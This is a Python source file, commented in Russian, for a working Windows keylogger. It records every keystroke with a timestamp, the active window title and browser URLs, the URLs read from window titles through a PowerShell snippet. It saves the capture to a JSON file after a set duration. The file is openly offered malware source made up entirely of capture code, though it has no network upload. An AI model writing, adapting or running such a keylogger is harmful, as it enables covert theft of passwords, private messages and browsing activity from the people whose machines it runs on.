#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Keylogger с отслеживанием активных окон и сайтов
"""

import threading
import time
import json
from datetime import datetime
from pynput import keyboard
import subprocess
import re

class KeyLogger:
    def __init__(self, duration_seconds, output_file):
        self.duration = duration_seconds
        self.output_file = output_file
        self.start_time = time.time()
        self.end_time = self.start_time + duration_seconds
        self.keys_pressed = []
        self.active_windows = []
        self.websites = []
        self.listener = None
        
    def get_active_window(self):
        """Получить активное окно"""
        try:
            import ctypes
            GetWindowText = ctypes.windll.user32.GetWindowTextW
            GetForegroundWindow = ctypes.windll.user32.GetForegroundWindow
            
            hwnd = GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            GetWindowText(hwnd, buf, length + 1)
            return buf.value
        except:
            return "Unknown"
    
    def get_active_website(self):
        """Получить активный сайт из браузера"""
        try:
            # Пытаемся получить URL из Chrome/Edge через PowerShell
            ps_script = """
            $browsers = @('chrome', 'msedge', 'firefox')
            foreach ($browser in $browsers) {
                $processes = Get-Process $browser -ErrorAction SilentlyContinue
                if ($processes) {
                    # Для Chrome/Edge - получаем из окна
                    $window = Get-Process $browser | Select-Object -First 1
                    if ($window) {
                        $title = $window.MainWindowTitle
                        if ($title -match 'http') {
                            Write-Output $title
                            exit
                        }
                    }
                }
            }
            """
            
            result = subprocess.run(
                ['powershell', '-NoProfile', '-Command', ps_script],
                capture_output=True,
                text=True,
                timeout=2
            )
            
            if result.stdout:
                # Извлекаем URL из заголовка окна
                url_match = re.search(r'https?://[^\s]+', result.stdout)
                if url_match:
                    return url_match.group(0)
        except:
            pass
        
        return None
    
    def on_press(self, key):
        """Обработчик нажатия клавиши"""
        try:
            if time.time() > self.end_time:
                return False
            
            # Получаем активное окно
            window = self.get_active_window()
            
            # Получаем активный сайт
            website = self.get_active_website()
            
            # Преобразуем клавишу в текст
            try:
                if hasattr(key, 'char'):
                    char = key.char
                else:
                    char = str(key).replace('Key.', '')
            except:
                char = str(key)
            
            # Сохраняем нажатие
            self.keys_pressed.append({
                'time': datetime.now().isoformat(),
                'key': char,
                'window': window,
                'website': website
            })
            
        except Exception as e:
            pass
    
    def on_release(self, key):
        """Обработчик отпускания клавиши"""
        if time.time() > self.end_time:
            return False
    
    def monitor_windows(self):
        """Мониторить активные окна в фоне"""
        while time.time() < self.end_time:
            try:
                window = self.get_active_window()
                website = self.get_active_website()
                
                # Добавляем только если это новое окно/сайт
                if window and (not self.active_windows or self.active_windows[-1]['window'] != window):
                    self.active_windows.append({
                        'time': datetime.now().isoformat(),
                        'window': window,
                        'website': website
                    })
                
                time.sleep(1)
            except:
                pass
    
    def start(self):
        """Запустить keylogger"""
        try:
            # Запускаем мониторинг окон в отдельном потоке
            monitor_thread = threading.Thread(target=self.monitor_windows, daemon=True)
            monitor_thread.start()
            
            # Запускаем listener для клавиш
            with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                self.listener = listener
                listener.join()
        except Exception as e:
            print(f"Ошибка keylogger: {e}")
    
    def stop(self):
        """Остановить keylogger"""
        if self.listener:
            self.listener.stop()
    
    def save_log(self):
        """Сохранить лог в файл"""
        try:
            log_data = {
                'duration': self.duration,
                'start_time': datetime.fromtimestamp(self.start_time).isoformat(),
                'end_time': datetime.fromtimestamp(self.end_time).isoformat(),
                'keys_pressed': self.keys_pressed,
                'active_windows': self.active_windows,
                'total_keys': len(self.keys_pressed),
                'unique_windows': len(set(w['window'] for w in self.active_windows))
            }
            
            with open(self.output_file, 'w', encoding='utf-8') as f:
                json.dump(log_data, f, ensure_ascii=False, indent=2)
            
            return True
        except Exception as e:
            print(f"Ошибка сохранения лога: {e}")
            return False

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 2:
        try:
            duration = int(sys.argv[1])
            output_file = sys.argv[2]
            
            logger = KeyLogger(duration, output_file)
            
            # Запускаем в отдельном потоке
            log_thread = threading.Thread(target=logger.start, daemon=True)
            log_thread.start()
            
            # Ждем завершения
            time.sleep(duration + 1)
            
            # Останавливаем и сохраняем
            logger.stop()
            logger.save_log()
            
        except Exception as e:
            print(f"Ошибка: {e}", file=sys.stderr)
            sys.exit(1)
    else:
        print("Использование: keylogger_module.py <duration> <output_file>", file=sys.stderr)
        sys.exit(1)
